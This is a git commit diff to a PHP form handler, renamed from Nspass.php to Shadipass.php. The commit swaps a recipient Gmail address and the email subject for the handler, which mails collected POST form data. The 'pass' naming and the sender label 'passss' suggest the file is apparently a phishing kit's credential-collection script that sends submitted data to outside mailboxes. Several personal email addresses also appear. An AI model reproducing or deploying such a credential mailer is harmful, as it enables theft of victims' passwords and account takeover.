9f60320d4a9837a2ad665edd9762b9d4a179878c
Meri3394 <metaserve7@gmail.com>
2025-07-10 17:07:03 +0500

    Update and rename Nspass.php to Shadipass.php

--- Shadipass.php
+++ Shadipass.php
@@ -35,7 +35,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->setFrom('Lernayouamzaxal@gmail.com', 'passss');
-        $mail->addAddress('jessicanimraads@gmail.com');
+        $mail->addAddress('averywilson180@gmail.com');
         $mail->addAddress('Lernayouamzaxal@gmail.com');
 
 
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'ns';
+        $mail->Subject = 'Shadi';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
